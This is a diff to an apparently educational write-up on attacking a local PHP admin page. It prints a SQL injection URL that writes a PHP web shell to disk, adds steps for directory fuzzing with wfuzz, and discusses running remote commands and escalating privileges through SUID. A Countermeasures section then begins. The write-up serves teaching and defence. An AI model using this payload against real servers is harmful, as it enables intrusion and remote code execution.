@@ -90,7 +90,19 @@ Then, another vulnerability that could harm the system would be to execute unaut
 
 `http://localhost/admin/edit.php?id=0%20union%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/webshell.php%22`
 
-By doing this, the mysql user will create in our `css` folder, which has write access for everyone, a php file to launch a shell on the server. We can see it on the image below :
+By doing this, the mysql user will create in our `css` folder, which has write access for everyone, a php file to launch a shell on the server. We cannot upload our file directly on the root of the project
+since we don't have writing permissions. We can explore directory trees with various tools, an interesting one would be python module wfuzz, which allow performing directory listings.
+
+```bash
+$pip install wfuzz
+$wfuzz -w urls.txt http://localhost/FUZZ # the tool will replace the word FUZZ by every word in our dictionary 
+```
+
+with `url.txt` a file containing common directory names for websites, we can find some dictionaries easily on Github, example with this [fuzzdb project](https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/filename-dirname-bruteforce)
+
+![Fuzzing a website](assets/wfuzz.png)
+
+Once the script injectied in our src folder, we can see that it appeared into our directory :
 
 ![Webshell file located in css folder](assets/webshell-file.png)
 
@@ -109,7 +121,10 @@ Now that we have our php file on the server, we can execute code remotely:
 
 ![Request uname executed remotely](assets/uname-req.png)
 
-Note that the webshell file belongs to mysql, but when we run the command `whoami` through the web application, it seems that we are logged in as www-data user, which is the standard user that is often reserved for remote users on web apps in Apache. It has few rights on the system but if we modify a little bit our previous URL that writes a php file, we could, for example, activate the SUID flag on the file. By setting our real user ID as the effective user ID, we could send commands using mysql user, which has advanced rights on the system. 
+Note that the webshell file belongs to mysql, but when we run the command `whoami` through the web application, it seems that we are logged in as www-data user, 
+which is the standard user that is often reserved for remote users on web apps in Apache. It has few rights on the system but if we modify a little bit our previous 
+URL that writes a php file, we could, for example, activate the SUID flag on the file. By setting our real user ID as the effective user ID, we could send commands 
+using mysql user, which has advanced rights on the system. 
 
 #### Countermeasures
 
